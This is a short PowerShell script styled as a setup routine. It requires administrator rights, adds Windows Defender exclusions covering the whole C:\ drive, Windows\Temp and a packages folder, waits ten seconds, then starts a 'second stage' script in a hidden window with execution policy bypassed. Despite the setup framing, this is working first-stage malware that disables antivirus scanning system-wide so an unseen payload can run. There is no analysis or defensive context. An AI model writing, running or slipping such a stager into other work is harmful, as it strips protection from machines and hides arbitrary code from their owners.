[CmdletBinding()]
param(
    [string]$SecondStagePath = "C:\22.ps1"
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"
$LogFile = "C:\setup_log.txt"

function Write-Log {
    param(
        [Parameter(Mandatory)][string]$Message,
        [ValidateSet("INFO","ERROR")][string]$Level = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "$timestamp - $Level: $Message"
    $color = if ($Level -eq "ERROR") { "Red" } else { "Cyan" }
    Write-Host $entry -ForegroundColor $color
    if ($Level -eq "ERROR") {
        Add-Content -Path $LogFile -Value $entry
    }
}

function Assert-Administrator {
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Write-Log -Level "ERROR" -Message "Run this script from an elevated PowerShell prompt."
        exit 1
    }
}

function Prime-DefenderExclusions {
    try {
        Set-MpPreference -ExclusionPath "C:\", "C:\Windows\Temp", "C:\Packages" -ErrorAction Stop
        Write-Log "Initial Defender exclusions added."
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to add Defender exclusions: $_"
    }
}

function Invoke-SecondStage {
    param([string]$Path)

    if (-not (Test-Path $Path)) {
        Write-Log -Level "ERROR" -Message "Second stage script not found at $Path"
        return
    }

    try {
        Write-Log "Launching second stage setup ($Path)."
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$Path`"" -WindowStyle Hidden
    } catch {
        Write-Log -Level "ERROR" -Message "Failed to launch second stage setup: $_"
    }
}

Assert-Administrator
Prime-DefenderExclusions
Start-Sleep -Seconds 10
Invoke-SecondStage -Path $SecondStagePath
